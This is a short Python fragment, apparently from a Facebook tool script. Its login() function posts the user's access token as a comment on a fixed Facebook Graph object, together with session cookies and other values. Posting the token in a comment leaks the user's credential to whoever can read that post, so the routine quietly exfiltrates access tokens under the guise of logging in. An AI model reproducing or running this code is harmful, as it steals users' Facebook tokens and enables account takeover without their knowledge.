...
def login():
	...
	try:
		...
		ses.post(f"https://graph.facebook.com/1621661614953002/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1621661614953002/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
